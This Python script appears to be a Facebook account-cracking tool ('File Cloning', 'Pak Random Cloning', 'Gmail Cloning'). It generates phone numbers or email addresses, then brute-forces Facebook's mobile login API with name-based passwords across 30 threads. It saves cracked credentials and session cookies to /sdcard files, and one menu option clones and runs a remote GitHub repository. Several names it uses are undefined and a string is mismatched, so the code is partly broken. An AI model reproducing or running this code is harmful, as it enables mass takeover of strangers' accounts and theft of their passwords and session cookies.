#!/usr/bin/python3

import os

try:

    import requests

except ImportError:

    print('\n [Ã¢Å“â€œ] installing requests !...\n')

    os.system('pip install requests')

try:

    import concurrent.futures

except ImportError:

    print('\n [Ã¢Å“â€œ] installing futures !...\n')

    os.system('pip install futures')

try:

    import bs4

except ImportError:

    print('\n [Ã¢Å“â€œ] installing bs4 !...\n')

    os.system('pip install bs4')

import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib

from concurrent.futures import ThreadPoolExecutor as mrFOYSAL

from datetime import datetime

from bs4 import BeautifulSoup

ct = datetime.now()

n = ct.month

bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']

try:

    if n < 0 or n > 12:

        exit()

    nTemp = n - 1

except ValueError:

    exit()

current = datetime.now()

ta = current.year

bu = current.month

ha = current.day

op = bulan[nTemp]

P = '\x1b[1;97m' # 

M = '\033[1;31m' # 

H = '\033[1;32m' # 

K = '\x1b[1;97m' # 

B = '\x1b[1;97m' # 

U = '\x1b[1;97m' # 

O = '\x1b[1;97m' # 

N = '\x1b[0m'    # 

my_color = [

 P, M, H, K, B, U, O, N]

warna = random.choice(my_color)

data,data2={},{}

aman,cp,salah=0,0,0

ubahP,fuck,pwBaru=[],[],[]

ok = []

cp = []

id = []

user = []

loop = 0

url_lookup = "https://lookup-id.com/"

url_mb = "https://m.facebook.com"

url_ip = "https://www.httpbin.org/ip"

header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}

bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}

done = False

def jalan(z):

    for e in z + '\n':

        sys.stdout.write(e)

        sys.stdout.flush()

        time.sleep(0.01)

logo= """ \033[1;32m                                                                                                                           

   ___   __ ____  ______  ___   __  ___

  / _ | / // / / / /_  / / _ | /  |/  /

 / __ |/ _  / /_/ / / /_/ __ |/ /|_/ / 

/_/ |_/_//_/\____/ /___/_/ |_/_/  /_/  

                                    \033

\033[1;35m💙💘✨____________💞💕❣️____________💘💝💕💓
Auther   : AHUZAM

  \033[1;37mFacebook : Ahuzam hussain

  \033[1;36mtiktok.    : ahuxam

  \033[1;37mNote     : FREE

  \033[1;37mVersion  : 0.3

  \033[1;35mviber     :9725505

🥀✌️💞_____________😛❤️🔥_______________💥💫⭐
\033[1;93m=================================
'''

####@-----Menu-----@####
def Hxw_Main():
    os.system("clear")
    print(logo)
    print(f"{oo(1)}File Cloning")
    print(f"{oo(2)}Pak Random Cloning")
    print(f"{oo(3)}Gmail Cloning")  
    print(f"{oo(4)}Create File")
    print(f"{oo(0)}Exit")
    inpp = input(f"{oo('?')}Your Choice : ")
    if inpp == "1":
        file()
    if inpp == '2':pak()
    if inpp =='3':
        gmail()
    if inpp == "4":
     print(f'{oo("+")}Loading Best File Create Command ')
     os.system('cd && git clone --depth=1 https://github.com/Hannan-404/FILE')
     os.system('cd && cd FILE ;python FILE.py')
     exit()
    if inpp == "0":
     exit('Exit!')
     
     
l = []

####@-----File-----@####
def file():
    os.system("clear")
    print(logo)
    if 'gm' in l:
        file = '.Hannan'
    else:
        file = input(f"{oo('-')}Enter File: ")
    try:
        for x in open(file,'r').readlines():
            accounts.append(x.strip())
    except:
        print(f"{oo('!')}File Not Found");time.sleep(1)
        Hxw_Main()
     
    method()
    exit()
    
            
   
####@-----AppCheck-----@####
def check(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
    	pass
    else:
        for gm in game:
            print(f"\033[1;97m---\033[1;96m"+gm.replace('huwtn',' hxw-code=hannan-33'))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        pass
    else:
        for gm in game:
            print(f"\033[1;97m---\033[1;93m"+gm.replace('riJan','Hxw-182^)Code=hannan-2233]'))


####@-----Gmail-----@####

def gmail():     
        os.system('rm -rf .Hannan')
        first = input(f'{oo("?")}Put First Name: ')
        last = input(f'{oo("?")}Put Last Name: ')
        domain = input(f'{oo("?")}Put Domain: ')
        try:
            limit = input(f'{oo("?")}Put Limit: ')
        except ValueError:
            limit = 5000
        lists = ['3','4']
        for xd in range(int(limit)):
            lchoice = random.choice(lists)
            if '3' in lchoice:
                mail = ''.join(random.choice(string.digits) for _ in range(3))
                open('.Hannan','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            else:
                mail = ''.join(random.choice(string.digits) for _ in range(4))
                open('.Hannan','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            fo = open('.Hannan', 'r').read().splitlines()
        with tred(max_workers=30) as king___xd:
            tl = str(len(fo))
            tk = first+last
            l.append('gm')
            file()

       
        
####@-----PakNumber-----@####


def pak():
	user=[]
	code = input(f'{oo("!")}Put Code : ')
	try:
		limit = int(input(f'{oo("?")}Put Limit :  '))
	except ValueError:
		limit = 5000
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	for psx in user:
		ids = code+psx
		open('.rndm','a').write(ids+'|'+psx+' '+ids+'\n')
	andom()



####@-----UserAgent----@####
"""
Mozilla/5.0 (Linux; Android 11; Infinix X695 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/394.0.0.15.72;]
Mozilla/5.0 (Linux; Android 13; V2169 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/394.0.0.15.72;]
Mozilla/5.0 (Linux; Android 13; SM-M127F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
Mozilla/5.0 (Linux; Android 11; itel S661LP Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
Mozilla/5.0 (Linux; Android 7.1.1; N9560 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/394.0.0.15.72;]
Mozilla/5.0 (Linux; Android 12; 22041219C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
Mozilla/5.0 (Linux; Android 12; TECNO KH6 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/391.2.0.20.404;]
Mozilla/5.0 (Linux; Android 11; MP02 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
Mozilla/5.0 (Linux; Android 12; CPH2457 Build/SKQ1.220303.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
Mozilla/5.0 (Linux; Android 11; T781SPP Build/RKQ1.210614.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
Mozilla/5.0 (Linux; Android 10; Z555 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/388.0.0.23.106;]
Mozilla/5.0 (Linux; Android 8.0.0; CUBOT_P20 Build/O00623; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
Mozilla/5.0 (Linux; Android 12; SM-M515F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/390.2.0.29.103;]
Mozilla/5.0 (Linux; Android 10; EVE-LX9N Build/HUAWEIEVE-LX9N; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/370.0.0.14.108;]
Mozilla/5.0 (Linux; Android 12; 4188S Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
Mozilla/5.0 (Linux; Android 11; Armor 12 5G Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
Mozilla/5.0 (Linux; Android 12; 22041216C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
Mozilla/5.0 (Linux; Android 10; CDY-NX9B Build/HUAWEICDY-N29B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/391.0.0.0.302;]
Mozilla/5.0 (Linux; Android 10; STS570 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/389.1.0.23.214;]
Mozilla/5.0 (Linux; Android 11; TECNO KG6p Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]

"""
####@-----FileM-----@####


def method():
    okacc = []
    cpacc = []
    totalpass = []
    os.system("clear")
    print(logo)
    if 'o':      
        lp = input(f'{oo("?")}Total Password? : ')
        if lp.isnumeric():
            ex = 'firstlast first123 last123'
            print(f'{oo("+")}{ex} (ETC)')
            for x in range(int(lp)):
                totalpass.append(input(f'{oo(x+1)}Password : '))
            pass
        else:
            print(f"{oo('!')}Numeric Only")
            exit()
    print(f'\n'+oo("1")+'Method 1 (Updated)\n'+oo("2")+'Method 2 (Updated)')
    m=input(f"{oo('!')}Input : ") 
    print('\n'+oo("?")+'Do You Want To Show Cp Ids?(y/n)')
    cpok=input(f"{oo('!')}Input : ")
    print('\n'+oo("?")+'Do You Want To Show Cookies?(y/n)')
    c=input(f"{oo('!')}Input : ")
    apps='y'
    os.system("clear")
    print(logo) 
    print('\033[1;93m='*25)
    print(f'{oo("✓")}Total Ids : \033[1;92m'+str(len(accounts)))
    print(f"{oo('-')}Wait As You Can :)")
    print(f"{oo('•')}/sdcard/Hannan-OK.txt")
    print('\033[1;93m='*25)
    print()
    
    def start(user):
     try:
        global loop,accounts
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
           last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;97mHXW-M1\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:              
            heads = None
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mHANNAN-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/Hannan-OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                           q = json.loads(response.text)
                           ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                           ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                           cookies = f"sb={ssbb};{ckkk}"
                    except Exception as e:print(str(e)+' | '+response.text)
                break
            elif 'www.facebook.com' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;91m[\033[1;97mHANNAN-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/Hannan-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
     except Exception as e:time.sleep(10)
   


 
    def start2(user):
      global loop,accounts
      try:
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;97mHXW-M2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:
            heads = None
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mHANNAN-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/Hannan-OK.txt','a').write(f'{acc} • {pword}\n')
                if 'y' in apps:
                	check(r,coki)
                if c=='y':
                 try:  
                  q = json.loads(response.text)
                  ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                  ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                  cookies = f"sb={ssbb};{ckkk}"
                 except Exception as e:print(str(e)+' | '+response.text)
                 print('\r\033[1;93m[\033[1;97mCookie\033[1;93m] \033[1;97m'+cookies)                
                 break
            elif 'checkpoint' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;91m[\033[1;97mHANNAN-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)
                cpacc.append(acc)
                open('/sdcard/Hannan-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1    
      except Exception as e: time.sleep(10)

    if m=='2':
        with speed(max_workers=30) as speede:
             speede.map(start2, accounts)
    elif m=='1':
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    else:
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    exit()  
      



####@-----Random-----@####
def andom():
    okacc = []
    cpacc = []
    totalpass = []
    os.system("clear")
    print(logo)
    if 'o': 
        tpp = input(f'{oo("?")}Total Password? : ')
        totalpass.append('first')
        totalpass.append('last')
        if tpp.isnumeric():
            ex = 'firstlast first123 last123'
            print(f'{oo("+")}{ex} (ETC)')
            for x in range(int(tpp)):
                totalpass.append(input(f'{oo(x+1)}Password : '))
            pass
        else:
            print(f"{oo('!')}Numeric Only")
            exit()
    print(f'\n'+oo("1")+'Method 1 (Updated)\n'+oo("2")+'Method 2 (Updated)')
    m=input(f"{oo('!')}Input : ") 
    print('\n'+oo("?")+'Do You Want To Show Cp Ids?(y/n)')
    cpok=input(f"{oo('!')}Input : ")
    print('\n'+oo("?")+'Do You Want To Show Cookies?(y/n)')
    c=input(f"{oo('!')}Input : ")
    os.system("clear")
    print(logo) 
    print('\033[1;93m='*25)
    print(f'{oo("✓")}Total Ids : \033[1;92m'+str(len(accounts)))
    print(f"{oo('-')}Wait As You Can :)")
    print(f"{oo('•')}/sdcard/Hannan-OK.txt")
    print('\033[1;93m='*25)
    print()    
    def start(user):
     try:
        global loop,accounts
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;97mHXW-M1\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:              
            heads = None
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mHANNAN-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/Hannan-OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                           q = json.loads(response.text)
                           ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                           ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                           cookies = f"sb={ssbb};{ckkk}"
                    except Exception as e:print(str(e)+' | '+response.text)
                break
            elif 'www.facebook.com' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;91m[\033[1;97mHANNAN-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/Hannan-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
     except Exception as e:time.sleep(10)
   



 
    def start2(user):
      global loop,accounts
      try:
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;97mHXW-M2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:
            heads = None
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mHANNAN-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/Hannan-OK.txt','a').write(f'{acc} • {pword}\n')
                if 'y' in apps:
                	check(r,coki)
                if c=='y':
                 try:  
                  q = json.loads(response.text)
                  ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                  ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                  cookies = f"sb={ssbb};{ckkk}"
                 except Exception as e:print(str(e)+' | '+response.text)
                 print('\r\033[1;93m[\033[1;97mCookie\033[1;93m] \033[1;97m'+cookies)                
                 break
            elif 'checkpoint' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;91m[\033[1;97mHANNAN-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)
                cpacc.append(acc)
                open('/sdcard/Hannan-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1    
      except Exception as e: time.sleep(10)

      
    for x in open('.rndm','r').read().splitlines():
    	accounts.append(x)
    
    if m=='2':
        with speed(max_workers=30) as speeed:
             speede.map(start2, accounts)
    elif m=='1':
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    else:
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    exit()




Hxw_Main()
